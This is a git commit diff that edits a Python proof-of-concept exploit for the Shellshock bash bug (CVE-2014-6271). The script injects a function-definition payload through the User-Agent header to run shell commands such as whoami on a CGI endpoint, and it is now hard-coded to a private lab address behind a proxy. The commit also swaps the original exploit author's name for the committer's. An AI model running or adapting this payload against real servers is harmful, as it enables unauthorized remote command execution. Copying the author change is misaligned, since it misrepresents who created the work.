ab57d8b120ee3b808744064d68f6ed2e17f0c87c
zionspike <kapi.zionspike@gmail.com>
2017-03-03 23:06:57 +0700

    Edit shellshock PoC

--- PoC/CVE2014-6271-ShellShock.py
+++ PoC/CVE2014-6271-ShellShock.py
@@ -3,7 +3,7 @@
 # Exploit Title: Shellshock
 # Google Dork: -
 # Date: 06/05/2015
-# Exploit Author: Juttikhun Khamchaiyaphum
+# Exploit Author: Kapi
 # Vendor Homepage: -
 # Software Link: -
 # Affected Version: versions 1.14 (released in 1994) to the most recent version 4.3 
@@ -20,29 +20,15 @@ import time
 import socket
 
 def send(fullURL,headers):
-    http = httplib2.Http()
+    # http = httplib2.Http()
+    http = httplib2.Http(proxy_info = httplib2.ProxyInfo(httplib2.socks.PROXY_TYPE_HTTP_NO_TUNNEL, '192.168.159.131', 3128) )
     body = {}
     response, content = http.request(fullURL, 'GET', headers=headers, body=urlencode(body))
     return (content)
 
-print "[*] Enter full URL to an existing object(.cgi or etc.) <include http/https>"
-fullURL = raw_input(">>")
-# fullURL = "http://192.168.111.103/cgi-bin/test.cgi"
-if fullURL.find("http://") != -1:
-	site = fullURL.replace("http://","")
-elif  fullURL.find("https://") != -1:
-	site = fullURL.replace("https://","")
-
-slashPos = site.find("/")
-if slashPos != -1:
-	host = site[:-(len(site)-slashPos)]
-	path = site[slashPos:len(site)]
-	print ("[*] Host : " + host)
-	print ("[*] Path : " + path)
-else:
-	fullSite = site
-	host = site
-	path = "/"
+# Edit here
+fullURL = "http://192.168.159.131/cgi-bin/status"
+host = "192.168.159.131"
 print ("[*] Full : " + fullURL)
 
 
@@ -58,10 +44,10 @@ try:
 	content = send(fullURL,headers)
 	print str(content)
 except (httplib2.HttpLib2Error,socket.error) as ex:
-    print '[!] Checking ' + fullURL + ' >> ' + "error, please specify full path to an existing object such jpg"
+    print '[!] Checking ' + fullURL + ' >> ' + "error, check URL"
 
 try:
-	command = "/usr/bin/id"
+	command = "/usr/bin/whoami"
 	header = '() { :; }; echo ; echo ; /bin/bash -c  '+command+';'
 	headers = {'User-Agent': header, 'Host': "" + host }
 	print "[*] Type 2 >> " + header
@@ -69,6 +55,6 @@ try:
 	content = send(fullURL,headers)
 	print str(content)
 except (httplib2.HttpLib2Error,socket.error) as ex:
-    print '[!] Checking ' + fullURL + ' >> ' + "error, please specify full path to an existing object such jpg"
+    print '[!] Checking ' + fullURL + ' >> ' + "error, check URL"
 
 
